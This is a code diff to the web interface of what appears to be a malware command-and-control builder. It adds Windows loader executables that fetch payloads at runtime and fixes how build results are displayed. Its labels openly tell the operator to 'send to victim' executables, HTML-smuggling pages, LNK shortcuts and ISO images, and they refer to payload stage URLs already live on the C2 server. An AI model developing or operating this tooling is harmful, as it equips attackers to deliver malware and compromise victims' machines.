@@ -11716,6 +11716,8 @@ function setLoaderFmt(fmt) {
     const btn = document.getElementById('lf-'+key);
     if (btn) btn.classList.toggle('seg-on', f === fmt);
   });
+  document.getElementById('pay-format').value = fmt;
+  _updatePayOutPlaceholder();
 }
 
 function setDeliveryFmt(fmt) {
@@ -12122,7 +12124,14 @@ function _updatePayOutPlaceholder() {
   const t    = (document.getElementById('pay-transport')?.value || 'http');
   const lang = (document.getElementById('pay-lang')?.value      || 'nim');
   const fmt  = (document.getElementById('pay-format')?.value    || 'exe');
-  const name = `agent_${t}_${lang}${_payExtForFormat(fmt)}`;
+  const loaderFmts = ['loader', 'loader-c', 'loader-nim', 'loader-rust'];
+  let name;
+  if (loaderFmts.includes(fmt)) {
+    const suffix = fmt === 'loader-c' ? '_c_amd64' : fmt === 'loader-nim' ? '_nim' : fmt === 'loader-rust' ? '_rust_amd64' : '_amd64';
+    name = `loader${suffix}.exe`;
+  } else {
+    name = `agent_${t}_${lang}${_payExtForFormat(fmt)}`;
+  }
   const el = document.getElementById('pay-outname');
   if (el) el.placeholder = `auto (${name})`;
 }
@@ -12616,6 +12625,7 @@ function renderBuildResult(container, data) {
   const labels = {
     exe:'Windows EXE — send to victim', dll:'Windows DLL', bin:'Raw shellcode (.bin)',
     enc:'Encrypted shellcode — already staged automatically', stub:'C loader stub', linux:'Linux ELF', macho:'macOS Mach-O',
+    loader:'Loader EXE — send to victim (fetches payload at runtime)',
     html:'HTML Smuggling — send to victim (embedded EXE, no staging)',
     lnk:'LNK shortcut — send to victim',
     iso:'ISO image — send to victim (contains LNK)',
@@ -12630,13 +12640,14 @@ function renderBuildResult(container, data) {
     bin_stage:'Stage URL — ya activa en el C2 (no subir manualmente)',
     runner_stage:'Stage URL runner DLL — ya activa en el C2',
     ps1_stage:'Stage URL loader PS1 — already active on C2 (LNK downloads it automatically)',
+    compressed_kb: null, raw_kb: null,
   };
-  const ext2icon = {exe:'🪟',dll:'📦',bin:'💉',enc:'🔒',stub:'🔧',
+  const ext2icon = {exe:'🪟',dll:'📦',bin:'💉',enc:'🔒',stub:'🔧',loader:'🚀',
                     lnk:'🔗',iso:'💿',hta:'🌐',html:'🌐',linux:'🐧',macho:'🍎'};
 
-  // Stage URLs first, files second
+  // Stage URLs first, files second; skip keys with null label (metadata fields)
   const stageKeys = ['bin_stage','runner_stage'];
-  const fileKeys  = Object.keys(data).filter(k => !stageKeys.includes(k));
+  const fileKeys  = Object.keys(data).filter(k => !stageKeys.includes(k) && labels[k] !== null);
   const ordered   = [...stageKeys.filter(k => data[k]), ...fileKeys];
 
   let rows = '';
